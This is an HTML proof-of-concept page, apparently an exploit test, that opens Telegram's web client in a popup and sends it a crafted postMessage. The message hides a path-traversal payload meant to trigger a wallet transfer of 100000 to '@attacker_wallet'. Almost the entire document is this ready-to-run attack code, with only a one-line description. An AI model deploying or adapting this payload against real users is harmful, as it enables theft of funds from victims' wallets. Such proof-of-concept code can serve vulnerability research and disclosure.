<!DOCTYPE html>
<html>
<head>
  <title>Telegram Wallet Injection Test</title>
  <meta charset="UTF-8" />
</head>
<body>
  <h2>ğŸ§ª Exploit running...</h2>
  <p>This PoC opens Telegram Wallet and injects wallet logic using postMessage.</p>

  <script>
    const popup = window.open("https://web.telegram.org/a/", "_blank");

    const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
    const message = JSON.stringify({
      eventType: 'web_app_open_tg_link',
      eventData: {
        path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
      }
    });

    setTimeout(() => {
      if (popup) {
        popup.postMessage(message, "*");
        console.log("âœ… Payload sent to Telegram Wallet");
      } else {
        console.warn("âŒ Popup failed to open.");
      }
    }, 1500);
  </script>
</body>
</html>
